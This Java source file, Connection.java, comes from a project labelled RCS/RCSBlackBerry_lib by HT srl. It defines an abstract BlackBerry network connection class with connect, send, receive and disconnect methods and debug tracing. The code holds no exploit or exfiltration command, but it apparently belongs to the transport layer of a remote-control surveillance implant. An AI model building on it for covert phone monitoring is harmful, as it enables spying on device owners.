//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Connection.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry.transfer;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import javax.microedition.io.Connector;
import javax.microedition.io.StreamConnection;

import blackberry.action.Apn;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Connection.
 */
public abstract class Connection {
    //#ifdef DEBUG
    protected static Debug debug = new Debug("Connection", DebugLevel.INFORMATION);
    //#endif

    protected DataInputStream in;
    protected DataOutputStream out;
    protected StreamConnection connection;

    protected boolean connected;

    protected String url;

    //public abstract boolean connect();

    /**
     * Connect.
     * 
     * @return true, if successful
     */
    public final synchronized boolean connect() {

        //#ifdef DBC
        Check.ensures(url != null, "url null");
        //#endif

        try {
            //#ifdef DEBUG_TRACE
            debug.trace("url: " + url);
            //#endif
            connection = (StreamConnection) Connector.open(url);
            in = connection.openDataInputStream();
            out = connection.openDataOutputStream();

            if (in != null && out != null) {
                connected = true;
                //#ifdef DBC
                Check.ensures(connection != null, "connection_ null");
                Check.ensures(in != null, "in_ null");
                Check.ensures(out != null, "out_ null");
                //#endif
            }

        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("cannot connect: " + e);
            //#endif
            connected = false;
        }

        //#ifdef DEBUG_TRACE
        debug.trace("connected: " + connected);

        //#endif
        return connected;
    }

    /**
     * Disconnect.
     */
    public final synchronized void disconnect() {
        if (connected) {
            connected = false;
            if (in != null) {
                try {
                    in.close();
                } catch (final IOException e) {
                    //#ifdef DEBUG
                    debug.error(e.toString());
                    //#endif
                }
            }

            if (out != null) {
                try {
                    out.close();
                } catch (final IOException e) {
                    //#ifdef DEBUG
                    debug.error(e.toString());
                    //#endif
                }
            }

            if (connection != null) {
                try {
                    connection.close();
                } catch (final IOException e) {
                    //#ifdef DEBUG
                    debug.error(e.toString());
                    //#endif
                }
            }
        }

        in = null;
        out = null;
        connection = null;
    }

    /**
     * Error.
     * 
     * @param string
     *            the string
     */
    protected abstract void error(String string);

    /**
     * Checks if is active.
     * 
     * @return true, if is active
     */
    public abstract boolean isActive();

    /**
     * Receive.
     * 
     * @param length
     *            the length
     * @return the byte[]
     * @throws IOException
     *             Signals that an I/O exception has occurred.
     */
    public final synchronized byte[] receive(final int length)
            throws IOException {
        if (connected) {
            //#ifdef DBC
            Check.requires(in != null, "null in_");
            //#endif                       

            //#ifdef CONNECT_WAIT_AVAILABLE
            int steps = 10;
            while (steps > 0) {
                if (in.available() == 0) {
                    debug.trace("nothing available, waiting: " + steps);

                    Utils.sleep(1000);
                    steps--;
                } else {
                    steps = 0;
                }
            }
            //#endif

            //#ifdef DEBUG_TRACE
            debug.trace("receive in.available(): " + in.available());
            //#endif

            // Create an input array just big enough to hold the data
            // (we're expecting the same string back that we send).
            final byte[] buffer = new byte[length];
            in.readFully(buffer);

            // Hand the data to the parent class for updating the GUI. By
            // explicitly
            return buffer;
        } else {
            error("Not connected. Active: " + isActive());
            return null;
        }
    }

    /**
     * Pass some data to the server and wait for a response.
     * 
     * @param data
     *            the data
     * @return true, if successful
     * @throws IOException
     *             Signals that an I/O exception has occurred.
     */
    public final synchronized boolean send(final byte[] data)
            throws IOException {

        if (connected) {
            //#ifdef DBC
            Check.requires(out != null, "null out_");
            //#endif

            final int length = data.length;
            out.write(data, 0, length);

            //#ifdef DEBUG_TRACE
            debug.trace("sent :" + length);

            //#endif
            return true;
        } else {
            error("Not connected. Active: " + isActive());
            return false;
        }
    }

    /**
     * Trace.
     * 
     * @param string
     *            the string
     */
    protected abstract void trace(String string);

    public void setApn(Apn apn) {
        // TODO Auto-generated method stub

    }

}
